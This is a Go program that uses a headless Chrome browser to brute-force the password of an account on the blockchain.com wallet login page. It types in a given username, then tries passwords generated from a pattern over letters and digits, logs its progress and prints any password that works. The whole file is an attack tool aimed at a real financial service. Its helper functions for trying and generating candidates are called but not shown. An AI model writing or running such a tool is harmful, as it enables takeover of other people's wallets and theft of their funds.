package main

import (
	"context"
	"fmt"
	"log"
	"regexp/syntax"
	"time"

	"github.com/alixaxel/genex"
	"github.com/chromedp/chromedp"
)

const (
	loginSelector    = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(1) > div.FormItem__Wrapper-hgTVpY.fgtRFA > div > input"
	passwordSelector = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(2) > div > div > input"
	noteSelector     = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(2) > div > div.FormError__Error-cnoJyA.dDlHQD.Text__BaseText-cyIABw.fmVBdx > span"
	submitSelector   = "#app > div > div.Public__ContentContainer-ejuVqQ.hqHAQl > div > form > div:nth-child(3) > button"
	signoutSelector  = "#app > div > div.template__Nav-dNuRir.bVRcIk > div > div > div.NavbarMenu__BaseMenu-gSUDcE.eBAlO > ul > li:nth-child(4) > a > span:nth-child(1)"
)

var (
	username string
	template string
)

var password string

func main() {

	charset, err := syntax.Parse(`[0-9a-zA-Z]`, syntax.Perl)
	die(err)

	input, err := syntax.Parse(template, syntax.Perl)
	die(err)

	start := time.Now()
	tries, total := 0, genex.Count(input, charset, 3)

	go func() {
		for {
			time.Sleep(10 * time.Second)
			fmt.Printf("time: %s, tries: %d, total: %d, current: %s\n", time.Since(start).Round(time.Second).String(), tries, int(total), password)
		}
	}()

	var cancel func()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	client, err := chromedp.New(ctx) // , chromedp.WithLog(log.Printf)
	die(err)

	err = client.Run(ctx, chromedp.Tasks{
		chromedp.Navigate("https://login.blockchain.com/#/login"),
		chromedp.SendKeys(loginSelector, username, chromedp.ByQuery),
	})
	die(err)

	resCh, nothingCh := make(chan string), make(chan struct{})
	go func() {
		for password = range words(input, charset) {
			tasks := try(password, resCh)
			err = client.Run(ctx, tasks)
			if err != nil {
				log.Println(err)
				return
			}
			tries++
		}
		nothingCh <- struct{}{}
	}()

	select {
	case result := <-resCh:
		fmt.Printf("password: `%s`", result)
	case <-nothingCh:
		fmt.Println("no password found")
	}

	err = client.Shutdown(ctx)
	die(err)

	err = client.Wait()
	die(err)

	fmt.Printf("done in %s", time.Since(start).String())
}

func die(err error) {
	if err != nil {
		panic(err)
	}
}
